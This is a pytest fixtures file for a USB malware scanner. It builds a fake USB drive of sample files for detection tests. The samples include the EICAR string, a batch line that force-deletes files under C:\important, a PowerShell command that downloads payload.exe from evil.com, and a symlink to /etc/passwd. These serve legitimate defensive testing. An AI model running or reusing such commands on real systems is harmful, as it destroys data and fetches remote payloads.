"""
conftest.py — pytest fixtures for USB-Defender tests.
"""

import os
import sys
import tempfile
import pytest

# Ensure app/ is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# Redirect the writable data dir *before* any app module is imported.
# db.py and signatures.py resolve their paths at import time, so without
# this the suite would read and write the developer's real
# ~/.local/share/usb-defender (or %APPDATA%) directory.
_TEST_DATA_DIR = tempfile.mkdtemp(prefix="usb-defender-tests-")
os.environ["USB_DEFENDER_DATA_DIR"] = _TEST_DATA_DIR


@pytest.fixture(autouse=True)
def fresh_db(tmp_path, monkeypatch):
    """
    Redirect DB_FILE and LOG_DIR to temp paths so tests don't pollute
    the real database. Runs init_db() automatically.
    """
    import db as db_module

    test_db = tmp_path / "test.db"
    test_log_dir = tmp_path / "logs"
    test_log_dir.mkdir()

    monkeypatch.setattr(db_module, "DB_FILE", test_db)
    monkeypatch.setattr(db_module, "LOG_DIR", test_log_dir)
    monkeypatch.setattr(db_module, "LOG_FILE", test_log_dir / "activity.log")

    db_module.init_db()
    yield tmp_path


@pytest.fixture(autouse=True)
def fresh_signatures(tmp_path, monkeypatch):
    """
    Give each test an isolated signatures.json seeded from the built-in
    defaults, and drop the module-level cache so edits in one test cannot
    leak into the next.
    """
    import json
    import signatures as sig_module

    sig_file = tmp_path / "signatures.json"
    with open(sig_file, "w") as f:
        json.dump(sig_module.DEFAULT_SIGNATURES, f, indent=4)

    monkeypatch.setattr(sig_module, "SIGNATURE_FILE", sig_file)
    monkeypatch.setattr(sig_module, "_cached_signatures", None)
    yield sig_file
    sig_module._cached_signatures = None


@pytest.fixture
def test_usb(tmp_path):
    """Create a fake USB directory with test files."""
    usb = tmp_path / "fake_usb"
    usb.mkdir()

    # Clean file
    (usb / "readme.txt").write_text("Hello, this is a clean readme.")

    # EICAR test file (exact standard string)
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    (usb / "eicar.com").write_text(eicar)

    # HTML injection
    (usb / "evil.html").write_text("<html><script>powershell -exec bypass</script></html>")

    # Batch file
    (usb / "destroy.bat").write_text("@echo off\ndel /f /q C:\\important\\*")

    # PowerShell dropper
    (usb / "dropper.ps1").write_text("Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\temp\\payload.exe")

    # Large file (> 5MB, should skip heuristic but still hash)
    large_file = usb / "large.bin"
    large_file.write_bytes(b"\x00" * (6 * 1024 * 1024))

    # Benign developer files — these must NOT be flagged. Each trips exactly
    # one weak keyword, which is the false-positive case that used to get
    # real user files encrypted and deleted.
    (usb / "helper.py").write_text(
        "import os\n"
        "import sys\n\n"
        "def main():\n"
        "    print(os.getcwd())\n"
    )
    (usb / "notes.txt").write_text(
        "Reminder: ask IT about the powershell execution policy on the lab PCs.\n"
    )
    (usb / "build.bat").write_text("@echo off\nnet user\n")

    # Symlink
    try:
        (usb / "symlink.txt").symlink_to("/etc/passwd")
    except OSError:
        pass  # Windows or permission issue

    return usb
